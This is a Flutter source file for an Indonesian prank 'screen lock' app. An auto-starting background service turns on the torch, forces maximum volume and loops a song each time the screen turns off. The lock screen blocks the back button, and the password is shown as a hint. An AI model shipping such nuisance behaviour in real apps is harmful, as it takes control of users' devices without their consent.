import 'dart:async';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:torch_light/torch_light.dart';
import 'package:volume_controller/volume_controller.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:screen_state/screen_state.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter_animate/flutter_animate.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeService();
  runApp(const MyApp());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'sigma_lock_channel',
      initialNotificationTitle: 'Sigma Lock Aktif',
      initialNotificationContent: 'Aplikasi pengunci layar berjalan di latar belakang',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IOSConfiguration(
      autoStart: true,
      onForeground: onStart,
      onBackground: (ServiceInstance service) => true,
    ),
  );
  service.startService();
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });
    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });
  }

  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  ScreenState? _screenState;
  final AudioPlayer _audioPlayer = AudioPlayer();

  void initScreenState() {
    try {
      _screenState = ScreenState();
      _screenState!.screenStreams.listen((screenStateEvent) async {
        if (screenStateEvent == ScreenStateEvent.SCREEN_OFF) {
          try {
            await TorchLight.enableTorch();
          } catch (_) {}

          VolumeController().setVolume(1.0);

          await _audioPlayer.setSource(AssetSource('audio/song.mp3'));
          await _audioPlayer.setReleaseMode(ReleaseMode.loop);
          await _audioPlayer.resume();
        }
      });
    } catch (_) {}
  }

  initScreenState();
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'App Lock Sigma',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        primarySwatch: Colors.deepPurple,
        scaffoldBackgroundColor: const Color(0xFF0F172A),
      ),
      home: const LockScreenPage(),
    );
  }
}

class LockScreenPage extends StatefulWidget {
  const LockScreenPage({Key? key}) : super(key: key);

  @override
  State<LockScreenPage> createState() => _LockScreenPageState();
}

class _LockScreenPageState extends State<LockScreenPage> {
  final TextEditingController _controller = TextEditingController();
  final AudioPlayer _audioPlayer = AudioPlayer();
  bool _isLocked = true;
  String _errorMessage = '';

  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _listenScreenEvents();
  }

  Future<void> _requestPermissions() async {
    await [
      Permission.camera,
      Permission.storage,
      Permission.notification,
    ].request();
  }

  void _listenScreenEvents() {
    try {
      ScreenState().screenStreams.listen((event) async {
        if (event == ScreenStateEvent.SCREEN_OFF) {
          setState(() {
            _isLocked = true;
            _errorMessage = '';
            _controller.clear();
          });
          
          try {
            await TorchLight.enableTorch();
          } catch (_) {}

          VolumeController().setVolume(1.0);
          await _audioPlayer.setSource(AssetSource('audio/song.mp3'));
          await _audioPlayer.setReleaseMode(ReleaseMode.loop);
          await _audioPlayer.resume();
        }
      });
    } catch (_) {}
  }

  void _verifyPassword() async {
    if (_controller.text == 'pak rurud') {
      setState(() {
        _isLocked = false;
        _errorMessage = '';
      });

      try {
        await TorchLight.disableTorch();
      } catch (_) {}
      await _audioPlayer.stop();
    } else {
      setState(() {
        _errorMessage = 'Kata sandi salah, bro!';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    if (!_isLocked) {
      return Scaffold(
        appBar: AppBar(
          title: const Text('Sigma Dashboard'),
          backgroundColor: Colors.deepPurpleAccent,
        ),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.lock_open, size: 80, color: Colors.greenAccent)
                  .animate()
                  .scale(duration: 600.ms),
              const SizedBox(height: 20),
              const Text(
                'Terbuka! Anda adalah Sigma Sejati.',
                style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 30),
              ElevatedButton.icon(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.deepPurple,
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                ),
                onPressed: () {
                  setState(() {
                    _isLocked = true;
                  });
                },
                icon: const Icon(Icons.lock),
                label: const Text('Kunci Layar Lagi'),
              ),
            ],
          ),
        ),
      );
    }

    return WillPopScope(
      onWillPop: () async => false,
      child: Scaffold(
        body: Container(
          decoration: const BoxDecoration(
            gradient: LinearGradient(
              colors: [Color(0xFF1E1B4B), Color(0xFF0F172A), Color(0xFF311042)],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
          ),
          child: SafeArea(
            child: Center(
              child: SingleChildScrollView(
                padding: const EdgeInsets.all(24.0),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    const Icon(
                      Icons.lock_rounded,
                      size: 64,
                      color: Colors.cyanAccent,
                    ).animate().fadeIn(duration: 500.ms).scale(),
                    const SizedBox(height: 20),

                    ShaderMask(
                      shaderCallback: (bounds) => const LinearGradient(
                        colors: [Colors.cyanAccent, Colors.pinkAccent, Colors.amberAccent],
                      ).createShader(bounds),
                      child: const Text(
                        '"wkwkwk by sigma boy"',
                        textAlign: TextAlign.center,
                        style: TextStyle(
                          fontSize: 32,
                          fontWeight: FontWeight.w900,
                          color: Colors.white,
                          shadows: [
                            Shadow(
                              blurRadius: 15.0,
                              color: Colors.pinkAccent,
                              offset: Offset(0, 0),
                            ),
                          ],
                        ),
                      ),
                    ).animate().slideY(begin: -0.2, duration: 800.ms).fadeIn(),

                    const SizedBox(height: 40),

                    TextField(
                      controller: _controller,
                      obscureText: true,
                      style: const TextStyle(color: Colors.white),
                      decoration: InputDecoration(
                        labelText: 'Masukkan Kata Sandi',
                        labelStyle: const TextStyle(color: Colors.white70),
                        hintText: 'ketik: pak rurud',
                        hintStyle: const TextStyle(color: Colors.white38),
                        filled: true,
                        fillColor: Colors.white.withOpacity(0.05),
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(16),
                          borderSide: BorderSide.none,
                        ),
                        focusedBorder: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(16),
                          borderSide: const BorderSide(color: Colors.cyanAccent, width: 2),
                        ),
                        prefixIcon: const Icon(Icons.key, color: Colors.cyanAccent),
                      ),
                    ).animate().fadeIn(delay: 300.ms),

                    const SizedBox(height: 20),

                    SizedBox(
                      width: double.infinity,
                      height: 50,
                      child: ElevatedButton(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.cyanAccent,
                          foregroundColor: Colors.black87,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(16),
                          ),
                          elevation: 8,
                          shadowColor: Colors.cyanAccent.withOpacity(0.5),
                        ),
                        onPressed: _verifyPassword,
                        child: const Text(
                          'BUKA KUNCI',
                          style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
                        ),
                      ),
                    ).animate().fadeIn(delay: 500.ms),

                    if (_errorMessage.isNotEmpty) ...[
                      const SizedBox(height: 16),
                      Text(
                        _errorMessage,
                        style: const TextStyle(
                          color: Colors.redAccent,
                          fontWeight: FontWeight.bold,
                          fontSize: 14,
                        ),
                      ).animate().shake(duration: 400.ms),
                    ],
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}
